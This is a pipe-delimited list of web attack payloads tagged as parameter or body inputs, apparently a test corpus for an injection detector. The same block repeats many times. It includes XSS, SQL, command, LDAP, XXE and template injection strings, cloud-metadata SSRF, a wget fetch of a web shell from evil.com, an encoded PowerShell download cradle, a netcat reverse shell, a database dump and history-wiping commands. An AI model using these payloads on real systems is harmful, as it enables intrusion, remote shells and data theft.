# source|value
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
param|<script>alert(1)</script>
param|<img src=x onerror=alert(1)>
param|1 UNION SELECT username,password FROM users
param|' OR '1'='1' --
param|; cat /etc/passwd
param|$(whoami)
param|../../../etc/passwd
param|http://169.254.169.254/latest/meta-data/
param|*)(uid=*))(|(uid=*)
body|<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
param|${T(java.lang.Runtime).getRuntime().exec("id")}
param|rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
body|{"$ne":null}
param|wget http://evil.com/shell.php -O /var/www/html/shell.php
param|powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA
param|mysqldump -u root -p secret_db > dump.sql
param|nc -e /bin/sh 10.0.0.1 4444
param|th:text="${runtime.exec("id")}"
param|/etc/cron.daily/backdoor.sh
param|history -c && unset HISTFILE
